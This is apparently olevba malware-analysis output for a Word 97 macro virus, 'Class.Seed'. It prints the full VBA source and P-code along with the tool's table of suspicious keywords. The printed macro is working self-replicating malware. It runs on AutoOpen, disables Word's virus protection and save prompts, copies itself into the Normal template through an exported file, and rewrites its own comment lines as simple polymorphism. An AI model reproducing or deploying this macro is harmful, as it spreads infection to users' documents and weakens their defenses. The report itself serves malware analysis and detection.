olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Class.s
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Class.s - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
'21309284529365719726447.793225708578E+20213092845293657197264421309284529
Randomize
'6799816521429861435612.92297889160166E+206799816521429861435616799816521
s = 0: r = 0
'4109539840076720081003.15284229397527E+2041095398400767200810041095398400
On Error GoTo 87
'4427837764408136965761.8071642698765E+204427837764408136965764427837764
Options.VirusProtection = False
'13773369695005958411.30855217938316E+181377336969500595841137733696
Options.SaveNormalPrompt = False
'26300406276566706591361.49046135920551E+21263004062765667065913626300406276
Options.ConfirmConversions = False
'4586133841535959540642.45798218673592E+204586133841535959540644586133841
fx = ActiveDocument.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'241398369003237840367.81609381986373E+182413983690032378403624139836900
xf = NormalTemplate.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'10445862025775009921008.09564670277215E+20104458620257750099210010445862025
If xf > 90 And fx > 0 Then GoTo 87
'10663660225111576969001.18981888635136E+20106636602251115769690010663660225
If xf < 90 Then
'184358596935365619616.51995600979873E+18184358596935365619611843585969
    Set xs = NormalTemplate.VBProject.VBComponents.Item(1)
'38833825969463351455361.79937097799331E+21388338259694633514553638833825969
    ActiveDocument.VBProject.VBComponents.Item(1).Name = xs.Name
'4339513922516555133447.18412320517253E+1943395139225165551334443395139225
    ActiveDocument.VBProject.VBComponents.Item(1).Export "c:\Seed$.dll"
'4096896049210807168648.63655056302093E+194096896049210807168644096896049
End If
'155955139242227257763.47352294084171E+181559551392422272577615595513924
If fx = 0 Then Set xs = ActiveDocument.VBProject.VBComponents.Item(1)
'25679101009445429467041.14382282765052E+21256791010094454294670425679101009
k = Int(Rnd(1) * 100) + 1
'2274145344203678566564.63194663815018E+192274145344203678566562274145344
If k = 99 Then ActiveWindow.WindowState = wdWindowStateMinimize: ActiveDocument.FollowHyperlink Address:="http://www.cannabisculture.com", NewWindow:=False, AddHistory:=False, ExtraInfo:=Chr(67) + Chr(76) + Chr(65) + Chr(83) + Chr(83) + Chr(47) + Chr(83) + Chr(69) + Chr(69) + Chr(68)
'2398161960012448900892.98544805582081E+1923981619600124489008923981619600
l = Int(Rnd(1) * 75) + 1
'701741290040194332012.82060223953857E+19701741290040194332017017412900
If l = 74 Then ActiveWindow.WindowState = wdWindowStateMinimize: ActiveDocument.FollowHyperlink Address:="http://www.Microsoft.com", NewWindow:=False, AddHistory:=False, ExtraInfo:=Chr(67) + Chr(76) + Chr(65) + Chr(83) + Chr(83) + Chr(47) + Chr(83) + Chr(69) + Chr(69) + Chr(68)
'279993289711934460411.99336871122636E+1927999328971193446041279993289
m = Int(Rnd(1) * 50) + 1
'3333910810062043978242.06849089749741E+2033339108100620439782433339108100
If m = 49 Then MsgBox Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(80) + Chr(82) + Chr(79) + Chr(32) + Chr(86) + Chr(105) + Chr(82) + Chr(117) + Chr(83)
'1755386508170965460811.24571812446973E+2017553865081709654608117553865081
n = Int(Rnd(1) * 25) + 1
'31497020676147093235244.63299867165401E+20314970206761470932352431497020676
If n = 24 Then MsgBox Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(67) + Chr(76) + Chr(65) + Chr(83) + Chr(83) + Chr(32) + Chr(83) + Chr(69) + Chr(69) + Chr(68)
'2256630016407244508099.19000180807049E+192256630016407244508092256630016
xs.codemodule.AddFromFile ("c:\Seed$.dll")
'6729084961497575480963.34822768589028E+206729084961497575480966729084961
With xs.codemodule
'12935650225527492275846.82345557665546E+20129356502255274922758412935650225
    For poly = 1 To 4
'875686464395071276963.45958569549067E+1987568646439507127696875686464
    .deletelines 1
'16577077504116001516161.92296612396583E+20165770775041160015161616577077504
    Next poly
'3559792896663036750252.36027351332688E+203559792896663036750253559792896
End With
'4306640625329001554561.41689146055625E+204306640625329001554564306640625
If xf < 90 Then
'25395609600659976100001.67604953809306E+21253956096006599761000025395609600
    With xs.codemodule
'1433606769423380006446.06960443091648E+191433606769423380006441433606769
    .replaceline 1, "Sub AutoClose()"
'23056904025296359668016.83313642218743E+20230569040252963596680123056904025
    .replaceline 93, "Sub ToolsMacro()"
'12403054161185093304012.29572227447447E+20124030541611850933040112403054161
    End With
'191458753641837611248.01017690161175E+18191458753641837611241914587536
End If
'28014725376174464472254.88757427795252E+20280147253761744644722528014725376
With xs.codemodule
'244515769149788225443.6625583130607E+1824451576914978822544244515769
    For poly = 2 To 92 Step 2
'41554822539112516001.62531365990841E+184155482253911251600415548225
    r = Int(Rnd(412835) * 203989) + 8485
'3069049201398249918441.2222485939866E+203069049201398249918443069049201
    s = Int(Rnd(384958) * 285865) + 2988
'39623291136501961620251.9889371418264E+21396232911365019616202539623291136
    .replaceline poly, "'" & r * r & s * s & r * r * s * s & r * r & s * s & r * r
'2575664001817353792362.10522873906248E+202575664001817353792362575664001
Next poly
'15938305009170903329002.72390938465547E+20159383050091709033290015938305009
End With
'18664751161358473635566.6908212055064E+20186647511613584736355618664751161
87:
'477204025547012576892.6103660341753E+1947720402554701257689477204025
If xf > 90 And fx = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
'5419462689219122887841.18752831495481E+205419462689219122887845419462689
End Sub
'41920515025799142014813.35004448389514E+21419205150257991420148141920515025
Sub ViewVBCode()
'Word97/Class.Seed by Virus :)
End Sub


















-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Class.s
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 11331 bytes
' Line #0:
' 	FuncDefn (Sub AutoOpen())
' Line #1:
' 	QuoteRem 0x0000 0x0049 "21309284529365719726447.793225708578E+20213092845293657197264421309284529"
' Line #2:
' 	ArgsCall Read 0x0000 
' Line #3:
' 	QuoteRem 0x0000 0x0048 "6799816521429861435612.92297889160166E+206799816521429861435616799816521"
' Line #4:
' 	LitDI2 0x0000 
' 	St s 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	St r 
' Line #5:
' 	QuoteRem 0x0000 0x0049 "4109539840076720081003.15284229397527E+2041095398400767200810041095398400"
' Line #6:
' 	OnError 87 
' Line #7:
' 	QuoteRem 0x0000 0x0047 "4427837764408136965761.8071642698765E+204427837764408136965764427837764"
' Line #8:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #9:
' 	QuoteRem 0x0000 0x0043 "13773369695005958411.30855217938316E+181377336969500595841137733696"
' Line #10:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #11:
' 	QuoteRem 0x0000 0x004B "26300406276566706591361.49046135920551E+21263004062765667065913626300406276"
' Line #12:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #13:
' 	QuoteRem 0x0000 0x0048 "4586133841535959540642.45798218673592E+204586133841535959540644586133841"
' Line #14:
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	MemLd CountOfLines 
' 	St fx 
' Line #15:
' 	QuoteRem 0x0000 0x0047 "241398369003237840367.81609381986373E+182413983690032378403624139836900"
' Line #16:
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	MemLd CountOfLines 
' 	St xf 
' Line #17:
' 	QuoteRem 0x0000 0x004B "10445862025775009921008.09564670277215E+20104458620257750099210010445862025"
' Line #18:
' 	Ld xf 
' 	LitDI2 0x005A 
' 	Gt 
' 	Ld fx 
' 	LitDI2 0x0000 
' 	Gt 
' 	And 
' 	If 
' 	BoSImplicit 
' 	GoTo 87 
' 	EndIf 
' Line #19:
' 	QuoteRem 0x0000 0x004B "10663660225111576969001.18981888635136E+20106636602251115769690010663660225"
' Line #20:
' 	Ld xf 
' 	LitDI2 0x005A 
' 	Lt 
' 	IfBlock 
' Line #21:
' 	QuoteRem 0x0000 0x0046 "184358596935365619616.51995600979873E+18184358596935365619611843585969"
' Line #22:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set xs 
' Line #23:
' 	QuoteRem 0x0000 0x004B "38833825969463351455361.79937097799331E+21388338259694633514553638833825969"
' Line #24:
' 	Ld xs 
' 	MemLd New 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemSt New 
' Line #25:
' 	QuoteRem 0x0000 0x0049 "4339513922516555133447.18412320517253E+1943395139225165551334443395139225"
' Line #26:
' 	LitStr 0x000C "c:\Seed$.dll"
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #27:
' 	QuoteRem 0x0000 0x0048 "4096896049210807168648.63655056302093E+194096896049210807168644096896049"
' Line #28:
' 	EndIfBlock 
' Line #29:
' 	QuoteRem 0x0000 0x0047 "155955139242227257763.47352294084171E+181559551392422272577615595513924"
' Line #30:
' 	Ld fx 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set xs 
' 	EndIf 
' Line #31:
' 	QuoteRem 0x0000 0x004B "25679101009445429467041.14382282765052E+21256791010094454294670425679101009"
' Line #32:
' 	LitDI2 0x0001 
' 	ArgsLd Rnd 0x0001 
' 	LitDI2 0x0064 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	St k 
' Line #33:
' 	QuoteRem 0x0000 0x0048 "2274145344203678566564.63194663815018E+192274145344203678566562274145344"
' Line #34:
' 	Ld k 
' 	LitDI2 0x0063 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld wdWindowStateMinimize 
' 	Ld ActiveWindow 
' 	MemSt WindowState 
' 	BoS 0x0000 
' 	LitStr 0x001E "http://www.cannabisculture.com"
' 	ParamNamed Address 
' 	LitVarSpecial (False)
' 	ParamNamed NewWindow 
' 	LitVarSpecial (False)
' 	ParamNamed AddHistory 
' 	LitDI2 0x0043 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x004C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0041 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0053 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0053 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x002F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0053 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0045 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0045 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0044 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	ParamNamed ExtraInfo 
' 	Ld ActiveDocument 
' 	ArgsMemCall FollowHyperlink 0x0004 
' 	EndIf 
' Line #35:
' 	QuoteRem 0x0000 0x0049 "2398161960012448900892.98544805582081E+1923981619600124489008923981619600"
' Line #36:
' 	LitDI2 0x0001 
' 	ArgsLd Rnd 0x0001 
' 	LitDI2 0x004B 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	St l 
' Line #37:
' 	QuoteRem 0x0000 0x0046 "701741290040194332012.82060223953857E+19701741290040194332017017412900"
' Line #38:
' 	Ld l 
' 	LitDI2 0x004A 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld wdWindowStateMinimize 
' 	Ld ActiveWindow 
' 	MemSt WindowState 
' 	BoS 0x0000 
' 	LitStr 0x0018 "http://www.Microsoft.com"
' 	ParamNamed Address 
' 	LitVarSpecial (False)
' 	ParamNamed NewWindow 
' 	LitVarSpecial (False)
' 	ParamNamed AddHistory 
' 	LitDI2 0x0043 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x004C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0041 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0053 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0053 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x002F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0053 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0045 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0045 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0044 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	ParamNamed ExtraInfo 
' 	Ld ActiveDocument 
' 	ArgsMemCall FollowHyperlink 0x0004 
' 	EndIf 
' Line #39:
' 	QuoteRem 0x0000 0x0045 "279993289711934460411.99336871122636E+1927999328971193446041279993289"
' Line #40:
' 	LitDI2 0x0001 
' 	ArgsLd Rnd 0x0001 
' 	LitDI2 0x0032 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	St m 
' Line #41:
' 	QuoteRem 0x0000 0x0049 "3333910810062043978242.06849089749741E+2033339108100620439782433339108100"
' Line #42:
' 	Ld m 
' 	LitDI2 0x0031 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0050 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0052 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x004F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0056 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0069 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0052 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0075 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0053 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	ArgsCall MsgBox 0x0001 
' 	EndIf 
' Line #43:
' 	QuoteRem 0x0000 0x0049 "1755386508170965460811.24571812446973E+2017553865081709654608117553865081"
' Line #44:
' 	LitDI2 0x0001 
' 	ArgsLd Rnd 0x0001 
' 	LitDI2 0x0019 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	St n 
' Line #45:
' 	QuoteRem 0x0000 0x004B "31497020676147093235244.63299867165401E+20314970206761470932352431497020676"
' Line #46:
' 	Ld n 
' 	LitDI2 0x0018 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0043 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x004C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0041 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0053 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0053 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0053 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0045 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0045 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0044 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	ArgsCall MsgBox 0x0001 
' 	EndIf 
' Line #47:
' 	QuoteRem 0x0000 0x0048 "2256630016407244508099.19000180807049E+192256630016407244508092256630016"
' Line #48:
' 	LitStr 0x000C "c:\Seed$.dll"
' 	Paren 
' 	Ld xs 
' 	MemLd codemodule 
' 	ArgsMemCall AddFromFile 0x0001 
' Line #49:
' 	QuoteRem 0x0000 0x0048 "6729084961497575480963.34822768589028E+206729084961497575480966729084961"
' Line #50:
' 	StartWithExpr 
' 	Ld xs 
' 	MemLd codemodule 
' 	With 
' Line #51:
' 	QuoteRem 0x0000 0x004B "12935650225527492275846.82345557665546E+20129356502255274922758412935650225"
' Line #52:
' 	StartForVariable 
' 	Ld poly 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0004 
' 	For 
' Line #53:
' 	QuoteRem 0x0000 0x0045 "875686464395071276963.45958569549067E+1987568646439507127696875686464"
' Line #54:
' 	LitDI2 0x0001 
' 	ArgsMemCallWith deletelines 0x0001 
' Line #55:
' 	QuoteRem 0x0000 0x004B "16577077504116001516161.92296612396583E+20165770775041160015161616577077504"
' Line #56:
' 	StartForVariable 
' 	Ld poly 
' 	EndForVariable 
' 	NextVar 
' Line #57:
' 	QuoteRem 0x0000 0x0048 "3559792896663036750252.36027351332688E+203559792896663036750253559792896"
' Line #58:
' 	EndWith 
' Line #59:
' 	QuoteRem 0x0000 0x0048 "4306640625329001554561.41689146055625E+204306640625329001554564306640625"
' Line #60:
' 	Ld xf 
' 	LitDI2 0x005A 
' 	Lt 
' 	IfBlock 
' Line #61:
' 	QuoteRem 0x0000 0x004B "25395609600659976100001.67604953809306E+21253956096006599761000025395609600"
' Line #62:
' 	StartWithExpr 
' 	Ld xs 
' 	MemLd codemodule 
' 	With 
' Line #63:
' 	QuoteRem 0x0000 0x0048 "1433606769423380006446.06960443091648E+191433606769423380006441433606769"
' Line #64:
' 	LitDI2 0x0001 
' 	LitStr 0x000F "Sub AutoClose()"
' 	ArgsMemCallWith replaceline 0x0002 
' Line #65:
' 	QuoteRem 0x0000 0x004B "23056904025296359668016.83313642218743E+20230569040252963596680123056904025"
' Line #66:
' 	LitDI2 0x005D 
' 	LitStr 0x0010 "Sub ToolsMacro()"
' 	ArgsMemCallWith replaceline 0x0002 
' Line #67:
' 	QuoteRem 0x0000 0x004B "12403054161185093304012.29572227447447E+20124030541611850933040112403054161"
' Line #68:
' 	EndWith 
' Line #69:
' 	QuoteRem 0x0000 0x0046 "191458753641837611248.01017690161175E+18191458753641837611241914587536"
' Line #70:
' 	EndIfBlock 
' Line #71:
' 	QuoteRem 0x0000 0x004B "28014725376174464472254.88757427795252E+20280147253761744644722528014725376"
' Line #72:
' 	StartWithExpr 
' 	Ld xs 
' 	MemLd codemodule 
' 	With 
' Line #73:
' 	QuoteRem 0x0000 0x0044 "244515769149788225443.6625583130607E+1824451576914978822544244515769"
' Line #74:
' 	StartForVariable 
' 	Ld poly 
' 	EndForVariable 
' 	LitDI2 0x0002 
' 	LitDI2 0x005C 
' 	LitDI2 0x0002 
' 	ForStep 
' Line #75:
' 	QuoteRem 0x0000 0x0043 "41554822539112516001.62531365990841E+184155482253911251600415548225"
' Line #76:
' 	LitDI4 0x4CA3 0x0006 
' 	ArgsLd Rnd 0x0001 
' 	LitDI4 0x1CD5 0x0003 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x2125 
' 	Add 
' 	St r 
' Line #77:
' 	QuoteRem 0x0000 0x0047 "3069049201398249918441.2222485939866E+203069049201398249918443069049201"
' Line #78:
' 	LitDI4 0xDFBE 0x0005 
' 	ArgsLd Rnd 0x0001 
' 	LitDI4 0x5CA9 0x0004 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0BAC 
' 	Add 
' 	St s 
' Line #79:
' 	QuoteRem 0x0000 0x004A "39623291136501961620251.9889371418264E+21396232911365019616202539623291136"
' Line #80:
' 	Ld poly 
' 	LitStr 0x0001 "'"
' 	Ld r 
' 	Ld r 
' 	Mul 
' 	Concat 
' 	Ld s 
' 	Ld s 
' 	Mul 
' 	Concat 
' 	Ld r 
' 	Ld r 
' 	Mul 
' 	Ld s 
' 	Mul 
' 	Ld s 
' 	Mul 
' 	Concat 
' 	Ld r 
' 	Ld r 
' 	Mul 
' 	Concat 
' 	Ld s 
' 	Ld s 
' 	Mul 
' 	Concat 
' 	Ld r 
' 	Ld r 
' 	Mul 
' 	Concat 
' 	ArgsMemCallWith replaceline 0x0002 
' Line #81:
' 	QuoteRem 0x0000 0x0048 "2575664001817353792362.10522873906248E+202575664001817353792362575664001"
' Line #82:
' 	StartForVariable 
' 	Ld poly 
' 	EndForVariable 
' 	NextVar 
' Line #83:
' 	QuoteRem 0x0000 0x004B "15938305009170903329002.72390938465547E+20159383050091709033290015938305009"
' Line #84:
' 	EndWith 
' Line #85:
' 	QuoteRem 0x0000 0x004A "18664751161358473635566.6908212055064E+20186647511613584736355618664751161"
' Line #86:
' 	LineNum 87 
' 	BoS 0x0000 
' Line #87:
' 	QuoteRem 0x0000 0x0044 "477204025547012576892.6103660341753E+1947720402554701257689477204025"
' Line #88:
' 	Ld xf 
' 	LitDI2 0x005A 
' 	Gt 
' 	Ld fx 
' 	LitDI2 0x0000 
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' 	EndIf 
' Line #89:
' 	QuoteRem 0x0000 0x0048 "5419462689219122887841.18752831495481E+205419462689219122887845419462689"
' Line #90:
' 	EndSub 
' Line #91:
' 	QuoteRem 0x0000 0x004B "41920515025799142014813.35004448389514E+21419205150257991420148141920515025"
' Line #92:
' 	FuncDefn (Sub ViewVBCode())
' Line #93:
' 	QuoteRem 0x0000 0x001D "Word97/Class.Seed by Virus :)"
' Line #94:
' 	EndSub 
' Line #95:
' Line #96:
' Line #97:
' Line #98:
' Line #99:
' Line #100:
' Line #101:
' Line #102:
' Line #103:
' Line #104:
' Line #105:
' Line #106:
' Line #107:
' Line #108:
' Line #109:
' Line #110:
' Line #111:
' Line #112:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |http://www.cannabisc|URL                                          |
|          |ulture.com          |                                             |
|IOC       |http://www.Microsoft|URL                                          |
|          |.com                |                                             |
|IOC       |MSWord.Class        |Executable file name                         |
|Hex String|1Ip gaG 25$         |3149702067614709323524                       |
|Hex String| 1Ip gaG            |2031497020676147093235243149702067           |
|          |25$1Ip g            |                                             |
|Hex String|)W"'DtG             |29572227447447                               |
|Hex String|f%X10`~             |6625583130607E                               |
|Hex String|r9      8FUG        |72390938465547                               |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

